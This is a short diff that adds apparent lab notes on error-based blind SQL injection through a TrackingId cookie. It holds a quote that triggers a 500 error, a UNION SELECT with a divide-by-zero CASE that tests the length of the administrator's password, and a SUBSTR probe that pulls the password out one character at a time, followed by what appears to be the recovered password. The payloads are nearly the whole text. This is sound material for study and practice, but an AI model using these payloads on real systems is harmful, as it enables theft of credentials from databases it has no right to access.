@@ -1,0 +1,8 @@
+Cookie: TrackingId=8ii91NhVDKZExLfI' 
+// Triggers HTTP status code 500 error
+
+Cookie: TrackingId=8ii91NhVDKZExLfI' UNION SELECT CASE WHEN (USERNAME='administrator' AND LENGTH(PASSWORD)=20) THEN TO_CHAR(1/0) ELSE NULL END FROM USERS--;
+
+Cookie: TrackingId=431bAYiHEQ4jPq4S' AND 1=(SELECT CASE WHEN(SUBSTR(PASSWORD,1,1)='a') THEN 1/0 ELSE 1 END FROM USERS WHERE USERNAME='administrator')--;
+
+cd7kpdjm4e13i22s3pqf
